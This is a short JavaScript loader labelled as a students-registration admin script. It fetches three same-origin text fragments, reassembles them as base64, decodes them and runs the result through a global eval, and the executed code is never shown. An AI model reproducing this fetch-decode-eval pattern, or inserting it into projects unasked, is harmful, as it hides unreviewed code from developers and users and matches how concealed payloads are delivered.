/* admin-students-reg — 3-part full base64 + TextDecoder (UTF-8 safe) */
(function () {
  var F = ["/_asr_full_0.txt", "/_asr_full_1.txt", "/_asr_full_2.txt"];
  Promise.all(
    F.map(function (f) {
      return fetch(f, { credentials: "same-origin", cache: "no-store" }).then(function (r) {
        if (!r.ok) throw new Error(f + " " + r.status);
        return r.text();
      });
    })
  )
    .then(function (parts) {
      var b64 = parts.join("").replace(/\s+/g, "");
      var bin = atob(b64);
      var bytes = new Uint8Array(bin.length);
      for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
      var out = new TextDecoder("utf-8").decode(bytes);
      (0, eval)(out);
    })
    .catch(function (e) {
      console.error("[students-reg] load failed", e);
    });
})();
